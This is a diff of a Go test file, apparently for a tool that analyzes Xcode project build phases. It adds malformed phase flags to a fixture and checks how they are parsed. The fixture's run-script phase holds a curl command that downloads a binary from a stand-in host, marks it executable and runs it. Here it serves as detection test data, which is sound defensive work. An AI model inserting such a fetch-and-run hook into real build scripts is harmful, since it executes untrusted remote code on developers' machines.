@@ -17,6 +17,7 @@ func TestXcodeTargetRunScriptCreatesConnectedRootAndBehavior(t *testing.T) {
 		PHASE = {
 			isa = PBXShellScriptBuildPhase;
 			name = "Fetch helper";
+ runOnlyForDeploymentPostprocessing = 1; alwaysOutOfDate = malformed;
 			shellPath = /bin/sh;
 			shellScript = "curl https://xcode.example/p -o /tmp/xcode-p && chmod +x /tmp/xcode-p && /tmp/xcode-p";
 		};
@@ -32,6 +33,9 @@ func TestXcodeTargetRunScriptCreatesConnectedRootAndBehavior(t *testing.T) {
 	feature := findXcodeScriptFeature(t, graph)
 	if feature.Execution.Connectivity != behavior.ConnectivityConnected || len(feature.Execution.ExecutionRootIDs) != 1 || feature.Execution.ExecutionRootIDs[0] != root.ID {
 		t.Fatalf("target run-script feature lost exact root ownership: %#v", feature)
+	}
+	if feature.Qualifiers["runOnlyForDeploymentPostprocessing"] != "1" || feature.Qualifiers["alwaysOutOfDate"] != "" {
+		t.Fatalf("phase flags = %#v", feature.Qualifiers)
 	}
 	if feature.Qualifiers["phase"] != "Fetch helper" || feature.Qualifiers["shell"] != "/bin/sh" || feature.Qualifiers["targets"] != "App" {
 		t.Fatalf("run-script qualifiers = %#v", feature.Qualifiers)
